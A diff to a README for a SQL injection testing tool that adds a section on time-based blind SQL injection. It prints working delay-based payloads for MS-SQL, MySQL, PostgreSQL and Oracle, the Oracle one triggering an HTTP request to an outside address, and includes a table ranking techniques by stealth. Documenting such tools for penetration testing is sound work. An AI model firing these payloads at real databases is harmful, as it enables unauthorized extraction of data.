@@ -58,13 +58,62 @@ AND 1=CASE WHEN (SELECT TOP 1 name FROM master..sysdatabases)='master'
 THEN 1/0 ELSE 1 END
 ```
 
+### 3️⃣ Time-Based Blind SQL Injection (NEW 2026)
+
+**Module:** `time_based_blind_detector.py`
+
+Uses conditional time delays to infer database information by monitoring server response times. The **last resort** technique when neither error messages nor content changes are observable.
+
+**Key Features:**
+- ✅ **Database-specific delays**: WAITFOR DELAY (MS-SQL), SLEEP (MySQL), pg_sleep (PostgreSQL), UTL_HTTP (Oracle)
+- ✅ **Statistical timing analysis**: Multi-criteria detection with confidence scoring
+- ✅ **Character-by-character extraction**: ~95 requests per character
+- ✅ **Bitwise extraction**: 8 requests per character (91% reduction!)
+- ✅ **Automatic DBMS detection**: Identifies backend through timing probes
+- ✅ **Baseline establishment**: Adapts to network latency and server load
+
+**Example Payloads:**
+```sql
+-- MS-SQL: WAITFOR DELAY
+' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=68 WAITFOR DELAY '0:0:5'--
+
+-- MySQL: SLEEP
+' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116, SLEEP(5), 0)--
+
+-- PostgreSQL: pg_sleep
+' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT current_database()),1,1))=112 
+      THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+-- Oracle: UTL_HTTP timeout
+' AND (SELECT CASE WHEN ASCII(SUBSTR(user,1,1))=83 
+      THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--
+```
+
 **When to Use:**
-- **Boolean-based**: When error messages are suppressed, need stealth
-- **Error-based**: When errors are displayed, need speed
+- **Boolean-based**: First choice if responses differ consistently
+- **Error-based**: Use if errors are displayed
+- **Time-based**: Last resort when all other methods fail
 
-📖 See [BLIND_SQLI_GUIDE.md](BLIND_SQLI_GUIDE.md) for comprehensive documentation and usage examples.
+**References:**
+- Chris Anley (NGSSoftware)
+- Sherief Hammad (NGSSoftware)
+- Dafydd Stuttard & Marcus Pinto - "The Web Application Hacker's Handbook"
 
-🎬 **Demo:** Run `python demo_blind_sqli_inference.py` for an interactive demonstration.
+📖 See [TIME_BASED_BLIND_SQLI_GUIDE.md](TIME_BASED_BLIND_SQLI_GUIDE.md) for comprehensive documentation and usage examples.
+
+🎬 **Demo:** Run `python demo_time_based_blind_sqli.py` for an interactive demonstration.
+
+---
+
+**Blind SQLi Quick Reference:**
+
+| Technique | Speed | Stealth | When to Use |
+|-----------|-------|---------|-------------|
+| **Boolean-Based** | Fast | Medium | Content differentiation available |
+| **Error-Based** | Fast | Low | Error messages visible |
+| **Time-Based** | Slow | High | Last resort, no other options |
+
+📖 See [BLIND_SQLI_GUIDE.md](BLIND_SQLI_GUIDE.md) for boolean and error-based techniques.
 
 ---
 
